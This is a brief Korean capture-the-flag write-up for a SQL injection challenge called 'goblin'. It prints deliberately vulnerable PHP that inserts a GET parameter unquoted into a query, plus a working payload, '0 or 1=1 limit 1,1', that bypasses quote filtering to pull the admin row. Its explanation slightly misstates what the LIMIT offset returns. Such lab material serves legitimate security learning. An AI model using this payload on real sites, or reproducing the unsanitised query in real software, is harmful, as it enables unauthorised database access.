# GOBLIN

## code
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
```

## solution
위 코드를 보게 되면 GET방식으로 no만 받고 있다. 그렇지만 id가 admin이여야 문제가 풀리게 되므로 url뒤에
```
?no=0 or 1=1 limit 1,1
```
위아 같은 코드를 입력하게 되면 no에는 0인 거짓값이 들어가지만 or 1=1로 참을 만든후 limit 1,1을 사용해서 db의 첫번째 줄에 있는 것을 꺼내왔다. 근데 마침 그 위치에 admin이 있어서 문제가 풀리게 되었다.

## limit
```mysql
limit a,b
```
는 a인덱스 부터 b개 만큼 출력을 하겠다는 것이다.

-------